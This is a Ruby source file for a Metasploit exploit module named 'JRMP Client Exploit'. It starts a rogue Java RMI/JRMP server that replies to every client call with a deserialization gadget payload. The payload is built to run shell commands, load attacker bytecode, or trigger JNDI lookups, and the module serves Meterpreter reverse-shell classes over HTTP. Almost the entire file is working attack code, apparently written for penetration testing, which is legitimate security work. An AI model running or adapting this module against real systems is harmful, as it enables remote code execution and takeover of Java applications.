require_relative '../../../../lib/java/config'
require_relative '../../../../lib/java/jrmp'
require_relative '../../../../lib/java/gadgets'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::TcpServer
  Rank = NormalRanking

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'JRMP Client Exploit',
        'Description'    => '
      This JRMP server returns a deserialization payload for every JRMP call made to it
        ',
        'Author'         => ['mbechler'],
        'References'     =>
          [
          ],
        'Platform' => %w[java],
        'Arch' => [ARCH_CMD, ARCH_JAVA],
        'Targets'        =>
          [
            ['Generic', {
              'Arch' => ARCH_JAVA
            }]
          ],
        'DefaultTarget'  => 0
      )
    )

    register_options(
      [
        OptPort.new('SRVPORT', [true, 'The local port to listen on.', 1099]),
        OptString.new('GADGET', [true, 'Gadget to use in exploitation']),
        OptString.new('GADGET_FLAGS', [true, 'Gadget flags to set'])
      ]
    )
  end

  def is_payload_compatible?(name)
    p = framework.payloads[name]
    if name == 'cmd/unix/generic' ||
       name == 'cmd/windows/generic' ||
       name == 'java/jndi' ||
       name == 'java/classfile/meterpreter/reverse_tcp'
      return true
    end
    false
  end

  def compatible_payloads
    payloads = []

    c_platform, c_arch = normalize_platform_arch

    framework.payloads.each_module do |name, mod|
      payloads << [name, mod] if is_payload_compatible?(name)
    end

    payloads
  end

  def generate_single_payload(pinst = nil, _platform = nil, _arch = nil, explicit_target = nil)
    explicit_target ||= target

    if explicit_target.nil?
      raise MissingTargetError, 'No target has been specified.',
            caller
    end

    # If a payload instance was supplied, use it, otherwise
    # use the active payload instance
    real_payload = pinst ? pinst : payload_instance

    if real_payload.nil?
      raise MissingPayloadError, 'No payload has been selected.',
            caller
    end
  end

  def start_service(*args)
    reg = Java::Serialize::Registry.new(base: File.dirname(__FILE__) + '/../../../../lib/java/')
    reg.load('model/base-java9.json')
    reg.load('model/jdk-templates.json')
    reg.load('model/rmi.json')

    ptype = payload_instance.fullname

    classfiles = nil
    cmd = nil
    jndiurl = nil
    if ['payload/cmd/unix/generic',
        'payload/cmd/windows/generic'].include? ptype
      print_status('Trying command execution ' + payload.raw)
      vtypes = %w[exec bytecode classloading]
    # TODO: create adapted classfile payload
    elsif ptype == 'java/jndi'
      print_status('Trying JNDI lookup ' + payload.raw)
      jndiurl = payload.raw
      vtypes = ['jndi']
    else
      print_status('Trying bytecode execution')
      vtypes = %w[bytecode classloading]
      classfiles = payload_instance.generate_classfiles
    end

    gadgets = Java::Gadgets::BuiltinGadgets.new

    gparams = { 'classfiles' => classfiles,
                'cmd' => cmd,
                'jndiurl' => jndiurl,
                #        'classpath'=>get_uri + '/',
                'class' => 'metasploit.LoadPayload' }

    g = gadgets.get(datastore['GADGET'])

    if g.nil?
      print_error('Invalid gadget ' + datastore['GADGET'])
      return
        end

    ctx = Java::Prober::ProbeContext.new([], reg, params: gparams)

    datastore['GADGET_FLAGS'].split(',').each do |flag|
      ctx.flag(flag)
    end

    t = g.create(ctx, params: gparams)

    ex = Java::Serialize::JavaObject.new('Ljavax/management/BadAttributeValueExpException;', 'val' => t)
    @server = Java::JRMP::ExceptionJRMPServer.new(0, reg, ex, bind: false)
    super
  end

  def on_client_connect(client)
    @server.handle_connection(client)
  rescue StandardError => e
    print_error 'Have connection error'
    print_error e.to_s
  end

  def on_request_uri(cli, request)
    if request.uri =~ /metasploit.dat$/
      send_response(cli, stager_config,
                    'Content-Type' => 'text/plain',
                    'Pragma' => 'no-cache')
    elsif request.uri =~ /\.class$/i
      sp = request.uri.index('/', 1)
      n = request.uri[sp + 1..-1]
      found = false
      Java::Meterpreter.meterpreter_classes(datastore, [
                                              n
                                            ]).each do |cls|
        next if cls[0] != n
        found = true
        send_response(cli, cls[1],
                      'Content-Type' => 'text/plain',
                      'Pragma' => 'no-cache')
        print_status('Replied to request for class ' + request.uri)
        break
      end
      send_not_found(cli) unless found

    end
  end
end
